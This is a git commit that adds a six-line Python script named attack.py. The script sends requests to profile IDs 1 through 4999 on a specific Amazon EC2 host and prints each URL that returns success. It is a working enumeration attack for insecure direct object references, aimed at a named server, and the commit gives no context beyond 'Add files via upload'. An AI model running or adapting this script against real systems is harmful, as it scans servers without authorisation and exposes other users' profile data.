c788ad408d414d9fe9fc65aa753504143e6dd44a
anshpreet <70899047+Ansh339412@users.noreply.github.com>
2022-01-13 19:27:31 +0530

    Add files via upload

---
+++ attack.py
@@ -0,0 +1,6 @@
+import requests 
+for i in range(1,5000):
+    URL=f"http://ec2-3-13-85-11.us-east-2.compute.amazonaws.com/profile?id={i}"
+    r=requests.get(url=URL)
+    if r.status_code ==200:
+        print(URL)
